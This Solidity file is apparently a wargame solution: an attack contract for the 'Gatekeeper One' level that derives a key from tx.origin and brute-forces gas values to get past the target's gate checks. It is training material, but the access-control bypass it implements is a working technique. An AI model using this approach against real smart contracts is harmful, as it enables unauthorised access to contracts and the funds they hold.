// SPDX-License-Identifier: MIT
pragma solidity 0.8.14;

contract GatekeeperOneAttack {
    address targetAddress;
    bytes8 key;

    event PassedTheGate(uint256 gasBrute);

    constructor(address _targetAddress) {
        targetAddress = _targetAddress;
        key = bytes8(uint64(uint16(uint160(tx.origin))) + 2 ** 32); // + 2 ** 32 to make the 1-4 bytes are not 0
    }

    function attack(uint256 _lowerGas, uint256 _upperGas) public {
        // _lowerGas and _upperGas should be around 100 - 300
        uint256 gasBrute;
        bool success;
        for (gasBrute = _lowerGas; gasBrute <= _upperGas; gasBrute++) {
            (success, ) = targetAddress.call{gas: gasBrute + (8191 * 5)}( // 8191 * any number
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) {
                break;
            }
        }
        require(success, "failed");
        emit PassedTheGate(gasBrute);
    }
}
